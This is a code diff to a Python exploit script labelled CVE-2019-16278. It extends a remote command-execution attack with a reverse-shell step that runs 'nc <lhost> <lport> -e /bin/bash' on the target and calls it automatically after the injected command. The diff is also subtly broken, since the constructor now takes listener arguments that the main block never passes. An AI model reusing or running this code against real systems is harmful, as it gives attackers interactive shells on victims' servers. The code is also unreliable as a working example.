@@ -6,9 +6,10 @@ from log_colors import *
 # CVE-2019-16278
 class CVE2019_16278:
 
-    def __init__(self, rhost, rport):
+    def __init__(self, rhost, rport, lhost, lport):
         print (LogColors.BLUE + "target: " + rhost + ":" + rport + "..." + LogColors.ENDC)
         self.rhost, self.rport = rhost, rport
+        self.lhost, self.lport = lhost, lport
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connect()
 
@@ -41,16 +42,24 @@ class CVE2019_16278:
                 break
         print (LogColors.YELLOW + resp + LogColors.ENDC)
 
+    # revshell
+    def get_reverse_shell(self):
+        cmd = "nc {} {} -e /bin/bash".format(self.lhost, self.lport)
+        self.run(cmd)
+
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
     parser.add_argument('-rh','--host', required = True, help = "target host")
     parser.add_argument('-p','--port', required = True, help = "target port")
+    parser.add_argument('-lh','--lhost', required = True, help = "revshell listener host")
+    parser.add_argument('-lp','--lport', required = True, help = "revshell listener port")
     parser.add_argument('-c','--cmd', required = True, help = "command")
     args = vars(parser.parse_args())
     host, port = args['host'], args['port']
     cmd = args['cmd']
     cve = CVE2019_16278(host, port)
     cve.run(cmd)
+    cve.get_reverse_shell()
     #while True:
     #    cmd = input('sh$ ').lower()
     #    if (cmd == 'exit'):
